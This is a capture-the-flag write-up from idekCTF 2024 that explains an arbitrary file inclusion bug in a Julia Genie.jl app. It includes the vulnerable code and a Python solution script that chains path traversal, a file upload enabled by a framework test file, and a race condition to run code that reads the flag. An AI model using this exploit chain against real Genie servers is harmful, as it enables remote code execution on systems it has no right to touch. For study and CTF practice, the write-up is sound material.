---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466Y2X2DI25%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T092217Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDEaCXVzLXdlc3QtMiJGMEQCICnhNFMjJOnYivUI%2B4TIGfVrZZRVT1mcVn4nCms%2BnZjVAiBb8nXTuGFKIQv%2FO0%2B3SYcnu8MTvN%2FOiOyFMIXLlqO%2F4iqIBAjq%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMmRv6L8jjlmd61Ki4KtwDq6Ygswd5bfUuhBIZt9UwNKbjnqAGVRCu059qjRxee9SWcqBuwh7XMKcepXl54q1S9J9hyT2iPFwGW6lQ3vaEQVuD3ZkVYt1xD%2BmQazXgaZUU99bth1fdBNr7LAtEB4XfTWoZtCVuVXI8nYG00yj3Cnts3E%2FosIjNlVSgYLW8cwSfaYsmI4ZEc%2BL%2FNP2jK%2BieIc86WkJGzNjDfIDTkLIhQweCKluwUEcRZUQ7zGbHYkF2dkOBlhKW2iDelcCB1GfPjnXRB%2FqW%2FvgYU4bny%2F4%2BlFfrthANak5FCzYIftWFBQMGomugzyNJ0XEIQ1KEtwKX81FXXb1PF5aUimJ0dpfU8he%2Bhge7038qNt6xD6jPH8%2B2WMe4l47lnfNf3knANJMsVBCS6KJqAomVenpH%2F5I3BV68HxT3oYWStxZnfYX%2FW8jZ8tJaQPw9RmCdgOXV5T2tmNt2W%2FbHllQQZ76OhybK3LFcQcxh3R0kmG0RuiShJLeuLzdBdI8go0FZgJ0jl%2BHkyz2jXSS2D0u%2FXgbM3VnmaoZh50%2FjRcyGz%2FCl19Q1I1IWtoaymTJTgNY%2BRezYXyfAbNfZ6kypF2AHYM7xXYaBUmpeVLEHb1ESL%2B%2BBsoHDAlSw%2ByUo3RviWcKIDO4w%2BfHAwQY6pgHZ4ud4P4rtYjTeIW%2FG1i2%2B4ZwdJKdYUVux5njbFjeuva5LQ1KUwoja7iJ7sIR0ra80khLiGiJhot741UYLssX5%2B3XDvwsTWDkkX677bZAkMc%2BAPUz51USUS%2Bq0Twe5%2FW4Dj5i%2FoHG%2FEhYMl2l2lvIyvvc11gBoSVBTU7swidKcfv%2FLpT14QKpPTz0KXyMhMfrKbb%2Fu5qgZs9ersgKue00eDccthkaX\&X-Amz-Signature=159dd9ecc36ae9bfdde2c04ab0f996329727339d169acd04af3121d61058d7b4\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
